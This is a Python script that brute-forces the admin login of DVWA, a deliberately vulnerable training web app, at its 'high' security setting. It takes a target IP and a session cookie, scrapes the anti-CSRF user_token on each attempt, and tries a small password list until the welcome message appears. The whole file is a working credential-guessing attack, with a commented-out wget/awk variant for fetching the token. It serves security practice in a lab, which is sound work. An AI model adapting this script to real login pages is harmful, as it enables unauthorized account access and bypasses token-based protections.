
from sys import argv
import requests
import os

# var, param, ...
target = argv[1]	# DVWA IP
phpsessid = argv[2]	# session cookie
url_index = "http://" + target + "/vulnerabilities/brute/index.php"
url_login = "http://" + target + "/vulnerabilities/brute/index.php"

# password list
passwords = ["123456", "qwerty", "password", "asdasd"]

'''
# get content page and token -- test
out = os.popen("wget " + target + " -q -O - | grep user_token | awk NR==1'{print $4; exit}'").read()
token = str(out).split("'")
token = token[1]
'''

# create permanent session
session = requests.session()
cookie = { 'PHPSESSID': phpsessid, 'security': 'high' }

# session debug
print("Setup session cookie: {}".format(cookie))

for p in passwords:
	# get token
	content = session.get(url_index, cookies=cookie)
	lines = content.text.splitlines()
	for line in lines:
		if 'user_token' in line:
			line = line.split("'")
			user_token = line[5]
	
	data = { 'username': 'admin', 'password': p, 'Login': 'Login', 'user_token': user_token }
	test = session.get(url_login, cookies=cookie, params=data)
	res = test.text
	# print(res) #### only for debug output
	
	print("Test-- \t password: {} \t token: {} \t cookie: {}".format(p, user_token, cookie))

	if 'Username and/or password incorrect.' in res:
		print("Fail-- \t Username and/or password incorrect.")
		print("-"*20)

	if 'Welcome to the password protected area admin' in res:
		print("Good Job! The correct password in \"{}\"".format(p))
		print("-"*20)
